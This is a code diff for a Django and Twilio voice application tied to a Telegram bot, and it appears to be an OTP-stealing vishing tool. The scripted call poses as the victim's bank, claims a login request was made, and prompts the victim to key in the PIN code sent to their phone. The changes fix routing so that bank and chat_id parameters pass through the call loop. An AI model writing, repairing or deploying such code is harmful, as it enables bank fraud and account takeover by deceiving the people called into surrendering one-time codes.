@@ -418,12 +418,12 @@ class TelegrambotWebhookView(APIView):
 @csrf_exempt
 def voice(request,bank,chat_id):
     resp = VoiceResponse()
-    gather = Gather(num_digits=1, action=f'/pay/gather/{chat_id}/')
+    gather = Gather(num_digits=1, action=f'/pay/gather/{chat_id}/{bank}/')
     gather.say(f'We have received a login request on your {bank} account. If you did not request an OTP Press 1.')
     resp.append(gather)
 
     # If the user doesn't select an option, redirect them into a loop
-    resp.redirect(f'/pay/voice/{bank}/')
+    resp.redirect(f'/pay/voice/{bank}/{chat_id}/')
 
     return HttpResponse(str(resp))
 
@@ -441,7 +441,7 @@ def gather(request,chat_id,bank):
 
         # <Say> a different message depending on the caller's choice
         if choice == '1':
-            gather = Gather(action=f'/pay/gather/{chat_id}/')
+            gather = Gather(action=f'/pay/gather/{chat_id}/{bank}/')
             gather.say('We need to confirm your identity first before blocking this request. Enter the pin code sent to your phone number.')
             resp.append(gather)
         elif len(choice) > 3:
@@ -454,7 +454,7 @@ def gather(request,chat_id,bank):
             resp.say("Sorry, Please press 1 if you did not request for the Pin Code.")
 
     # If the user didn't choose 1 or 2 (or anything), send them back to /voice
-    resp.redirect(f'/pay/voice/{bank}/')
+    resp.redirect(f'/pay/voice/{bank}/{chat_id}/')
 
     return HttpResponse(str(resp))
 
